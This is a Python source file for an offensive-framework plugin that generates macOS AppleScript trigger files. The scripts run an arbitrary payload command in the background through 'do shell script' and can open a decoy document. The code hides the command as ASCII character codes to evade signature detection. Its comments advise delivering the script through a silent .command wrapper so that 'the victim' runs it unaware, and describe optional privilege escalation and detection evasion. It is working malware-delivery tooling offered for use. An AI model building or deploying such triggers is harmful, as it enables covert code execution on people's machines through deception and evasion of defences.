"""
Erebus Plugin - AppleScript Trigger
Author: Whispergate
Description: Creates macOS AppleScript (.scpt) trigger files executed via osascript.

Execution path:
  .scpt  → osascript update.scpt  (terminal)
           double-click in Finder (Script Editor opens and prompts Run)
  Recommended delivery: wrap in a .command launcher so the victim double-clicks
  the .command which runs osascript silently in the background.

AppleScript's `do shell script` runs commands via /bin/sh with optional privilege
escalation via `with administrator privileges`.  The script hides itself by not
opening any application window.  Command obfuscation reassembles the payload path
from ASCII character codes to avoid static string signatures.
"""

import pathlib
import random
import string
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class AppleScriptTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating AppleScript (.scpt) triggers targeting macOS.

    The script executes the payload command via 'do shell script' and optionally
    opens a decoy document via 'open'.  Command strings are reassembled from ASCII
    character codes to frustrate static string-based detection.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="applescript_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates macOS AppleScript (.scpt) triggers via osascript do shell script",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_applescript_trigger": self.create_applescript_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        print("[Plugin] AppleScript Trigger plugin loaded - Supporting macOS .scpt delivery")

    # ================================================================
    # Helpers
    # ================================================================

    @staticmethod
    def _rand_var(n: int = 5) -> str:
        return "".join(random.choices(string.ascii_lowercase, k=n)) + str(random.randint(10, 99))

    @staticmethod
    def _as_charcode(s: str) -> str:
        """
        Reassemble a string from ASCII character codes in AppleScript.

        Produces:  (character id 104) & (character id 101) & ...
        AppleScript evaluates this at runtime so the plaintext string never
        appears contiguously in the script source.
        """
        parts = [f"(character id {ord(c)})" for c in s]
        return " & ".join(parts)

    # ================================================================
    # Plugin Functions
    # ================================================================

    def create_applescript_trigger(
        self,
        command: str,
        output_filename: str = "update.scpt",
        payload_dir: Optional[pathlib.Path] = None,
        decoy_path: str = "",
        obfuscate_command: bool = True,
    ) -> pathlib.Path:
        """
        Create an AppleScript (.scpt text source) trigger for macOS.

        Args:
            command:           Shell command to run via 'do shell script'.
            output_filename:   Output .scpt filename.
            payload_dir:       Directory to write the script into.
            decoy_path:        Optional file to open with 'open' after execution.
            obfuscate_command: Reassemble command from ASCII char codes.

        Returns:
            pathlib.Path: Path to the created .scpt file.

        ## OPSEC Notes
        Detection Surface:
          - osascript spawning sh as child - detectable via Endpoint Security /
            Unified Log (process_exec events)
          - TCC may prompt if 'do shell script' touches protected paths
          - Script Editor may be launched if victim double-clicks .scpt directly;
            combine with .command wrapper to avoid this
        Hardening:
          - [MALLEABLE] Add `with administrator privileges` for UAC-style elevation
            (prompts user for password - use only if target context warrants it)
          - [MALLEABLE] Deliver via .command wrapper that calls osascript in background
          - Avoid Script Editor by never handing the victim a bare .scpt to open
        Evasion Maturity: Level 2 (Moderate) - osascript well-known; char-code
          obfuscation effective against simple YARA without wildcard rules.
        """
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        v_cmd = self._rand_var()

        if obfuscate_command:
            # Reassemble command from char codes at runtime
            cmd_expr = self._as_charcode(command)
            cmd_line = f'set {v_cmd} to {cmd_expr}'
        else:
            escaped = command.replace('"', '\\"')
            cmd_line = f'set {v_cmd} to "{escaped}"'

        # Background execution: append & to detach from osascript parent
        bg_command = f'{v_cmd} & " >/dev/null 2>&1 &"'

        decoy_block = ""
        if decoy_path:
            escaped_decoy = decoy_path.replace('"', '\\"')
            decoy_block = f'\nopen "{escaped_decoy}"'

        script = f"""-- AppleScript trigger
{cmd_line}
do shell script {bg_command}{decoy_block}
"""
        output_path = payload_dir / output_filename
        output_path.write_text(script, encoding="utf-8")
        return output_path


# Module-level instance for plugin auto-discovery
_plugin = AppleScriptTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
